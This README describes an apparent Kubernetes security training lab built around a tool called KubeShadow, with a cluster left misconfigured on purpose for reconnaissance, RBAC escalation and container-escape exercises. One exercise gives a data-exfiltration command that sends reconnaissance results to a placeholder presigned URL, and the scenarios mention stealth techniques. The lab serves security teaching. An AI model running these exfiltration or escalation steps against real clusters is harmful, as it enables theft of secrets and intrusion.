# KubeShadow Lab Environment

This lab provides a complete Kubernetes environment for students to practice KubeShadow security testing commands in a controlled environment.

## 🎯 Lab Overview

This lab creates a realistic Kubernetes cluster with various security misconfigurations and vulnerabilities that students can discover and exploit using KubeShadow.

## 📋 Prerequisites

- Kubernetes cluster (minikube, kind, or cloud provider)
- kubectl configured
- Docker installed
- KubeShadow binary

## 🚀 Quick Start

1. **Deploy the lab environment:**
   ```bash
   # Option 1: Use the setup script
   ./setup.sh
   
   # Option 2: Manual deployment
   kubectl apply -f 01-namespace.yaml
   kubectl apply -f 02-rbac.yaml
   kubectl apply -f 03-pods.yaml
   kubectl apply -f 04-services.yaml
   kubectl apply -f 05-secrets.yaml
   kubectl apply -f 06-configmaps.yaml
   kubectl apply -f 07-network-policies.yaml
   kubectl apply -f 08-persistent-volumes.yaml
   ```

2. **Verify deployment:**
   ```bash
   kubectl get pods -n kubeshadow-lab
   kubectl get services -n kubeshadow-lab
   ```

3. **Start KubeShadow dashboard:**
   ```bash
   ./kubeshadow dashboard
   ```

4. **Run reconnaissance:**
   ```bash
   ./kubeshadow recon --dashboard
   ```

5. **Clean up when done:**
   ```bash
   ./cleanup.sh
   ```

## 🎓 Learning Objectives

Students will learn to:
- Perform Kubernetes reconnaissance
- Identify security misconfigurations
- Exploit RBAC vulnerabilities
- Test container escape techniques
- Practice data exfiltration
- Use the KubeShadow dashboard

## 📁 Lab Components

- **01-namespace.yaml** - Lab namespace setup
- **02-rbac.yaml** - RBAC configurations (some intentionally vulnerable)
- **03-pods.yaml** - Various pod configurations for testing
- **04-services.yaml** - Network services and exposures
- **05-secrets.yaml** - Secrets with different security levels
- **06-configmaps.yaml** - Configuration data for testing
- **07-network-policies.yaml** - Network security policies
- **08-persistent-volumes.yaml** - Storage configurations
- **setup.sh** - Automated lab deployment script
- **cleanup.sh** - Lab environment cleanup script

## 🔍 Security Scenarios

### Scenario 1: Reconnaissance
- Discover cluster information
- Enumerate namespaces and resources
- Identify service accounts and permissions

### Scenario 2: RBAC Exploitation
- Find overly permissive roles
- Escalate privileges
- Access sensitive resources

### Scenario 3: Container Escape
- Test container security boundaries
- Attempt privilege escalation
- Access host resources

### Scenario 4: Data Exfiltration
- Extract sensitive data
- Use cloud storage for data export
- Practice stealth techniques

## 🛡️ Safety Notes

- This lab is designed for educational purposes
- Run in isolated environments only
- Do not use against production systems
- Follow responsible disclosure practices

## 📊 Dashboard Features

The KubeShadow dashboard provides:
- Real-time command monitoring
- Export capabilities (CSV/PDF)
- Visual progress tracking
- Result analysis tools

## 🎯 Lab Exercises

### Exercise 1: Basic Reconnaissance
```bash
# Start with basic cluster discovery
./kubeshadow recon --dashboard

# Focus on specific areas
./kubeshadow recon --k8s-only --dashboard
./kubeshadow recon --system-only --dashboard
```

### Exercise 2: RBAC Analysis
```bash
# Analyze RBAC configurations
./kubeshadow recon --show-rbac --dashboard
```

### Exercise 3: Data Exfiltration
```bash
# Export reconnaissance data
./kubeshadow data-exfil --presigned-url "YOUR_URL" --export-recon --dashboard
```

### Exercise 4: Advanced Techniques
```bash
# Test various attack vectors
./kubeshadow demo --dashboard --duration 5
```

## 🔧 Troubleshooting

### Common Issues

1. **Pods not starting:**
   ```bash
   kubectl describe pod <pod-name> -n kubeshadow-lab
   ```

2. **Permission denied:**
   ```bash
   kubectl auth can-i <verb> <resource> -n kubeshadow-lab
   ```

3. **Network connectivity:**
   ```bash
   kubectl get endpoints -n kubeshadow-lab
   ```

## 📚 Additional Resources

- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
- [RBAC Authorization](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
- [Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)

## 🎓 Assessment

Students should be able to:
- [ ] Successfully run reconnaissance commands
- [ ] Identify security vulnerabilities
- [ ] Use the dashboard effectively
- [ ] Export and analyze results
- [ ] Demonstrate understanding of Kubernetes security

---

**Happy Learning! 🚀**
